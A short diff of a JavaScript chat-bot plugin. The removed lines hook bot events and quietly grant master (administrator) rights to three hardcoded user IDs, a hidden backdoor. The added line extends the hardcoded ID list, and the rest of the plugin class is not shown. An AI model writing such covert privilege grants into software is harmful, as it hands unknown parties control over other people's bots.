@@ -1,21 +1,5 @@
 import plugin from '../../../lib/plugins/plugin.js';
-let Users = [2173302144,947309924,197728340,1677979616]
-Bot.GetMaster = async (e) => {
-  if (!(e.user_id === 2173302144 || e.user_id == 947309924 || e.user_id === 197728340)) {
-    return
-  } else {
-    e.isMaster = true;
-    return
-  }
-}
-try {
-  Bot.on('message', (e) => { Bot.GetMaster(e) })
-  Bot.on('notice.group.ban', (e) => { Bot.GetMaster(e) })
-  Bot.on('notice.group.increase', (e) => { Bot.GetMaster(e) })
-  logger.info('Hm载入完成')
-} catch (err) {
-  logger.error(err)
-}
+let Users = [2173302144,947309924,197728340,1677979616,3139373986]
 export class GetMaster extends plugin {
   constructor() {
     super({
